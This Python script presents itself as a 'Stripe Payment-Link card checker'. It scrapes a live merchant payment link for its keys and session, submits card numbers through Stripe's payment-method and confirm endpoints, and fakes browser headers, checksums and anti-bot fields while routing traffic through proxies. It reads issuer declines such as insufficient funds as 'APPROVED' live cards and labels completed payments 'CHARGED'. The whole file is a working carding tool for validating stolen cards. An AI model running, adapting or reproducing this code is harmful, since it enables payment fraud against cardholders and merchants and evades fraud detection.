#!/usr/bin/env python3
"""
Stripe Payment-Link card checker.
Library + optional CLI. No module-level side effects.
"""
import base64
import json
import os
import random
import re
import string
import urllib.parse
import uuid
from datetime import datetime

import requests

# ─── Config ──────────────────────────────────────────────────────────────
BUY_URL = os.getenv("BUY_URL", "https://buy.stripe.com/28o2apdMBcTa69G3cf")
PAYMENT_LINK_ID = BUY_URL.rstrip("/").split("/")[-1]
BILLING_EMAIL = os.getenv("BILLING_EMAIL", "gfdgdfigjdogj@gmail.com")
DEFAULT_COUNTRY = os.getenv("BILLING_COUNTRY", "US")
DEFAULT_LOCALE = os.getenv("STRIPE_LOCALE", "en")
DEFAULT_TIMEZONE = os.getenv("STRIPE_TIMEZONE", "America/New_York")
DEFAULT_REFERRER = os.getenv("REFERRER_ORIGIN", "https://buy.stripe.com")

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0"
)

REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "30"))


# ─── Utilities ───────────────────────────────────────────────────────────
def _rand_id(k=32):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=k))


def _uuid():
    return str(uuid.uuid4())


def _new_session(proxy=None):
    s = requests.Session()
    if proxy:
        s.proxies.update({"http": proxy, "https": proxy})
    return s


def parse_card_input(line):
    """Parse 'number|month|year|cvc[|name]' into a dict. Returns None on failure."""
    line = (line or "").strip().replace(" ", "")
    if not line:
        return None
    parts = line.split("|")
    if len(parts) < 4:
        return None
    number = parts[0].strip()
    month = parts[1].strip().zfill(2)
    year = parts[2].strip()
    if len(year) == 4:
        year = year[-2:]
    cvc = parts[3].strip()
    name = parts[4].strip() if len(parts) > 4 else "Card Holder"
    if not (number.isdigit() and len(number) in (15, 16)):
        return None
    if not (month.isdigit() and 1 <= int(month) <= 12):
        return None
    if not (year.isdigit() and len(year) == 2):
        return None
    if not (cvc.isdigit() and len(cvc) in (3, 4)):
        return None
    return {
        "number": number,
        "cvc": cvc,
        "exp_month": month,
        "exp_year": year,
        "name": name or "Card Holder",
        "email": BILLING_EMAIL,
    }


# ─── Scrapers ────────────────────────────────────────────────────────────
def _scrape_buy_page(session):
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": USER_AGENT,
    }
    r = session.get(BUY_URL, headers=headers, timeout=REQUEST_TIMEOUT)
    html = r.text
    pk = None
    m = re.search(r"pk_live_[A-Za-z0-9]+", html)
    if m:
        pk = m.group(0)
    cs = None
    m = re.search(r"cs_live_[A-Za-z0-9]+", html)
    if m:
        cs = m.group(0)
    return pk, cs


def _create_payment_link_session(session):
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://buy.stripe.com",
        "referer": "https://buy.stripe.com/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": USER_AGENT,
    }
    form = {
        "eid": "NA",
        "browser_locale": DEFAULT_LOCALE,
        "browser_timezone": DEFAULT_TIMEZONE,
        "referrer_origin": DEFAULT_REFERRER,
    }
    r = session.post(
        f"https://merchant-ui-api.stripe.com/payment-links/{PAYMENT_LINK_ID}",
        headers=headers,
        data=urllib.parse.urlencode(form),
        timeout=REQUEST_TIMEOUT,
    )
    if not r.ok:
        return {}
    try:
        return r.json()
    except Exception:
        return {}


# ─── Core check ──────────────────────────────────────────────────────────
def check_card(card_line, proxy=None, debug=False):
    """
    Check a single card against the configured Stripe payment link.

    Returns:
        {
          "status": "CHARGED" | "APPROVED" | "3DS" | "DECLINED" | "ERROR",
          "response": str,
          "code": str | None,
          "decline_code": str | None,
          "amount": int,          # cents
          "currency": str,
          "checkout_session_id": str,
          "payment_method_id": str | None,
        }
    """
    card = parse_card_input(card_line)
    if not card:
        return {"status": "ERROR", "response": "Invalid card format", "code": None,
                "decline_code": None, "amount": 0, "currency": "", "checkout_session_id": "",
                "payment_method_id": None}

    session = _new_session(proxy)

    try:
        # Step 1: scrape buy page
        pk_live, checkout_session_id = _scrape_buy_page(session)
        if not pk_live or not checkout_session_id:
            return {"status": "ERROR", "response": "Could not scrape pk_live / cs_live from buy page",
                    "code": None, "decline_code": None, "amount": 0, "currency": "",
                    "checkout_session_id": "", "payment_method_id": None}

        if debug:
            print(f"[debug] pk_live={pk_live}")
            print(f"[debug] checkout_session_id={checkout_session_id}")

        # Step 2: get payment-link session metadata
        pl_data = _create_payment_link_session(session)
        config_id = pl_data.get("config_id")
        init_checksum = pl_data.get("init_checksum")
        currency = (pl_data.get("currency") or "usd").lower()
        pl_site_key = pl_data.get("site_key")
        lig = pl_data.get("line_item_group") or {}
        expected_amount_cents = lig.get("total") or lig.get("due") or lig.get("subtotal")
        if expected_amount_cents is not None:
            expected_amount_cents = int(expected_amount_cents)
        line_item_id = None
        items = lig.get("line_items") or []
        if items:
            line_item_id = items[0].get("id")

        # Step 3: elements/sessions to recover amount if missing
        stripe_js_id = _uuid()
        api_headers = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": USER_AGENT,
        }
        es_params = {
            "client_betas[0]": "google_pay_beta_1",
            "client_betas[1]": "disable_deferred_intent_client_validation_beta_1",
            "client_betas[2]": "blocked_card_brands_beta_2",
            "deferred_intent[mode]": "payment",
            "deferred_intent[amount]": str(expected_amount_cents) if expected_amount_cents else "100",
            "deferred_intent[currency]": currency,
            "deferred_intent[payment_method_types][0]": "card",
            "deferred_intent[payment_method_types][1]": "link",
            "deferred_intent[capture_method]": "automatic_async",
            "currency": currency,
            "key": pk_live,
            "elements_init_source": "payment_link",
            "hosted_surface": "checkout",
            "referrer_host": "buy.stripe.com",
            "stripe_js_id": stripe_js_id,
            "locale": DEFAULT_LOCALE,
            "type": "deferred_intent",
            "checkout_session_id": checkout_session_id,
        }
        r = session.get("https://api.stripe.com/v1/elements/sessions",
                        params=es_params, headers=api_headers, timeout=REQUEST_TIMEOUT)
        es_data = {}
        try:
            es_data = r.json()
        except Exception:
            pass
        if not config_id:
            config_id = es_data.get("config_id")

        if expected_amount_cents is None:
            sess = es_data.get("session") or es_data
            expected_amount_cents = sess.get("amount_total") or sess.get("amount_subtotal") or es_data.get("amount")
        if expected_amount_cents is None:
            expected_amount_cents = 100
        expected_amount_cents = int(expected_amount_cents)
        expected_amount_str = str(expected_amount_cents)

        if not line_item_id:
            groups = es_data.get("displayed_line_item_groups") or []
            if groups and groups[0].get("line_items"):
                line_item_id = groups[0]["line_items"][0].get("id")
        if not line_item_id and es_data.get("line_items"):
            line_item_id = es_data["line_items"][0].get("id")

        buy_headers = {**api_headers, "origin": "https://buy.stripe.com",
                       "referer": "https://buy.stripe.com/"}

        # Step 4: lock in amount if we have a line item
        if line_item_id:
            session.post(
                f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}",
                headers=buy_headers,
                data=urllib.parse.urlencode({
                    "eid": "NA",
                    "updated_line_item_amount[line_item_id]": line_item_id,
                    "updated_line_item_amount[unit_amount]": str(expected_amount_cents),
                    "key": pk_live,
                }),
                timeout=REQUEST_TIMEOUT,
            )

        # Step 5: create PaymentMethod
        guid = _uuid()
        muid = _uuid()
        sid = _uuid()
        form_pm = {
            "type": "card",
            "card[number]": card["number"],
            "card[cvc]": card["cvc"],
            "card[exp_month]": card["exp_month"],
            "card[exp_year]": card["exp_year"],
            "billing_details[name]": card["name"],
            "billing_details[email]": card["email"],
            "billing_details[address][country]": DEFAULT_COUNTRY,
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": pk_live,
            "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; payment-link; checkout",
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": config_id or "",
        }
        r = session.post("https://api.stripe.com/v1/payment_methods",
                         headers=buy_headers, data=urllib.parse.urlencode(form_pm),
                         timeout=REQUEST_TIMEOUT)
        pm_resp = r.json() if r.content else {}
        pm_id = pm_resp.get("id") if r.ok else None
        pm_err = pm_resp.get("error") or {}

        if pm_err:
            return {
                "status": "DECLINED",
                "response": pm_err.get("message") or "PaymentMethod failed",
                "code": pm_err.get("code"),
                "decline_code": pm_err.get("decline_code"),
                "amount": expected_amount_cents,
                "currency": currency,
                "checkout_session_id": checkout_session_id,
                "payment_method_id": None,
            }
        if not pm_id:
            return {"status": "ERROR", "response": "No PaymentMethod id returned",
                    "code": None, "decline_code": None, "amount": expected_amount_cents,
                    "currency": currency, "checkout_session_id": checkout_session_id,
                    "payment_method_id": None}

        # Step 6: confirm payment
        init_checksum = init_checksum or _rand_id(32)
        js_checksum = _rand_id(50)
        pxvid = _uuid()
        rv_timestamp = _rand_id(120)

        confirm_form = {
            "eid": "NA",
            "payment_method": pm_id,
            "expected_amount": expected_amount_str,
            "last_displayed_line_item_group_details[subtotal]": expected_amount_str,
            "last_displayed_line_item_group_details[total_exclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_inclusive_tax]": "0",
            "last_displayed_line_item_group_details[total_discount_amount]": "0",
            "last_displayed_line_item_group_details[shipping_rate_amount]": "0",
            "expected_payment_method_type": "card",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": pk_live,
            "version": "148043f9d7",
            "init_checksum": init_checksum,
            "js_checksum": js_checksum,
            "pxvid": pxvid,
            "passive_captcha_token": "",
            "passive_captcha_ekey": pl_site_key or "",
            "rv_timestamp": rv_timestamp,
            "client_attribution_metadata[client_session_id]": stripe_js_id,
            "client_attribution_metadata[checkout_session_id]": checkout_session_id,
            "client_attribution_metadata[merchant_integration_source]": "checkout",
            "client_attribution_metadata[merchant_integration_version]": "payment_link",
            "client_attribution_metadata[payment_method_selection_flow]": "automatic",
            "client_attribution_metadata[checkout_config_id]": config_id or "",
        }
        r = session.post(
            f"https://api.stripe.com/v1/payment_pages/{checkout_session_id}/confirm",
            headers=buy_headers,
            data=urllib.parse.urlencode(confirm_form, safe=""),
            timeout=REQUEST_TIMEOUT,
        )
        data = r.json() if r.content else {}

        # Interpret response
        status = "DECLINED"
        response_msg = ""
        code = None
        decline_code = None

        if r.status_code == 200 and isinstance(data.get("id"), str) and data["id"].startswith("ppage_"):
            # ppage_ means 3DS challenge was returned OR payment needs auth
            status = "3DS"
            response_msg = "3DS / authentication required"
        err = data.get("error") or {}
        if err:
            code = err.get("code")
            decline_code = err.get("decline_code")
            response_msg = err.get("message") or response_msg or "Declined"
            # Heuristics: insufficient_funds / do_not_honor / cvc_check => live card but declined
            if code in ("card_declined",) and decline_code in (
                "insufficient_funds", "do_not_honor", "generic_decline", "incorrect_cvc",
                "invalid_cvc", "expired_card",
            ):
                # Map to APPROVED-ish (live) since we got a real issuer response
                status = "APPROVED"
            elif code in ("authentication_required",):
                status = "3DS"
            else:
                status = "DECLINED"
        elif r.status_code == 200 and not err:
            # No error + 200 = payment likely succeeded
            if data.get("payment_intent") or data.get("status") in ("succeeded", "requires_capture"):
                status = "CHARGED"
                response_msg = "Payment succeeded"
            else:
                status = "APPROVED"
                response_msg = data.get("status") or "OK"

        return {
            "status": status,
            "response": response_msg or "Unknown",
            "code": code,
            "decline_code": decline_code,
            "amount": expected_amount_cents,
            "currency": currency,
            "checkout_session_id": checkout_session_id,
            "payment_method_id": pm_id,
        }

    except requests.Timeout:
        return {"status": "ERROR", "response": f"Timeout after {REQUEST_TIMEOUT}s",
                "code": None, "decline_code": None, "amount": 0, "currency": "",
                "checkout_session_id": "", "payment_method_id": None}
    except Exception as e:
        return {"status": "ERROR", "response": f"{type(e).__name__}: {str(e)[:120]}",
                "code": None, "decline_code": None, "amount": 0, "currency": "",
                "checkout_session_id": "", "payment_method_id": None}


# ─── CLI ─────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python3 stripe_checker.py '4111111111111111|12|29|123'")
        sys.exit(1)
    result = check_card(sys.argv[1], debug=True)
    print(json.dumps(result, indent=2))
